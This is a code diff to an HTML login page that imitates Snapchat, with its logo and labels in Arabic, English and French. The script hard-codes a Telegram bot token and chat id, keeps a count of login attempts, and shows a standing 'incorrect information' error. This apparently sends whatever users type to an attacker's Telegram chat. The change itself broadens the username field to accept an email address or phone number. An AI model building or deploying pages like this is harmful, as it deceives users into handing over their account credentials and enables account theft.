@@ -84,7 +84,7 @@
         <img class="logo" src="https://1000logos.net/wp-content/uploads/2017/08/Snapchat-logo.png" alt="Snapchat Logo">
         <h1 id="title">تسجيل الدخول</h1>
         <form onsubmit="handleSubmit(event)">
-            <label id="username-label" for="username">اسم المستخدم</label>
+            <label id="username-label" for="username">اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف</label>
             <input type="text" id="username" name="username" required>
 
             <label id="password-label" for="password">كلمة المرور</label>
@@ -98,26 +98,26 @@
     <script>
         const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc'; // رمز البوت
         const chatId = '612575358'; // استبدل بـ chat_id الخاص بك
-        let attempt = 1;
+        let attempt = 1; // لتتبع عدد المحاولات
 
         const translations = {
             ar: {
                 title: "تسجيل الدخول",
-                usernameLabel: "اسم المستخدم",
+                usernameLabel: "اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف",
                 passwordLabel: "كلمة المرور",
                 submitButton: "تسجيل الدخول",
                 errorMessage: "المعلومات غير صحيحة، جرب مرة أخرى.",
             },
             en: {
                 title: "Login",
-                usernameLabel: "Username",
+                usernameLabel: "Username, email, or phone number",
                 passwordLabel: "Password",
                 submitButton: "Log in",
                 errorMessage: "Incorrect information, please try again.",
             },
             fr: {
                 title: "Connexion",
-                usernameLabel: "Nom d'utilisateur",
+                usernameLabel: "Nom d'utilisateur, e-mail ou numéro de téléphone",
                 passwordLabel: "Mot de passe",
                 submitButton: "Se connecter",
                 errorMessage: "Informations incorrectes, veuillez réessayer.",
